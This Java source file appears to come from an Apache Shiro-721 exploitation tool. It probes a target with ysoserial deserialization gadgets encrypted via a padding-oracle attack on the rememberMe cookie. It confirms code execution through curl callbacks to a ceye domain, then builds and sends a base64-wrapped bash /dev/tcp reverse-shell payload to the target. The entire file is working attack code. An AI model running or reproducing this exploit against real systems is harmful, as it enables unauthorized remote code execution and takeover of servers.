package com.shiroexploit.vulnverifier;

import com.shiroexploit.core.PaddingOracle;
import com.shiroexploit.util.*;
import org.apache.commons.codec.binary.Base64;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

public class Shiro721VerifiertUsingCeye implements Verifier {

    private Config config;
    private List<PayloadType> gadgets;

    public Shiro721VerifiertUsingCeye(){
        System.out.println("[*] Using Shiro721VerifiertUsingCeye");
        this.config = Config.getInstance();
        this.gadgets = new ArrayList<>();
    }


    @Override
    public void getValidGadget() throws ExploitFailedException {

        for(PayloadType type : PayloadType.values()){
            System.out.println("[*] Trying Gadget: " + type.getName());
            String uuid = UUID.randomUUID().toString().replaceAll("-", "");
            String command = "java -jar " + System.getProperty("user.dir") + File.separator + "ysoserial.jar " + type.getName() + " \"curl http://" + uuid + "." + config.getCeyeDomain() + "\"";
            byte[] result = Tools.exec(command);
            PaddingOracle paddingOracle = new PaddingOracle(config.getTargetURL(), config.getRememberMeCookie(), result);
            String rememberMe = paddingOracle.encrypt();
            HttpRequest.request(config.getTargetURL(), rememberMe);

            if(Tools.getCeyeResult(uuid, config.getCeyeToken())){
                this.gadgets.add(type);
                System.out.println("[+] Find Valid Gadget: " + type.getName());
                if(config.isSkipIfFound()){
                    break;
                }
            }
        }

        if(this.gadgets.size() == 0){
            throw new ExploitFailedException("[-] Can't find a valid gadget");
        }
    }


    @Override
    public void getReverseShell(){
        String str = "bash -i >& /dev/tcp/" + config.getReverseShellIP() + "/" + config.getReverseShellPort() + " 0>&1";
        String base64 = Base64.encodeBase64String(str.getBytes());
        String cmd = "bash -c {echo," + base64 + "}|{base64,-d}|{bash,-i}";

        for(PayloadType gadget : this.gadgets){
            String command = "java -jar " + System.getProperty("user.dir") + File.separator + "ysoserial.jar " + gadget.getName() + " \"" + cmd + "\"";
            byte[] result = Tools.exec(command);
            PaddingOracle paddingOracle = new PaddingOracle(config.getTargetURL(), config.getRememberMeCookie(), result);
            String rememberMe = null;
            try {
                rememberMe = paddingOracle.encrypt();
                System.out.println("[+] 反弹Shell payload：");
                System.out.println("rememberMe=" + rememberMe);
            } catch (ExploitFailedException e) {
                e.printStackTrace();
            }
            HttpRequest.request(config.getTargetURL(), rememberMe);
        }
    }
}
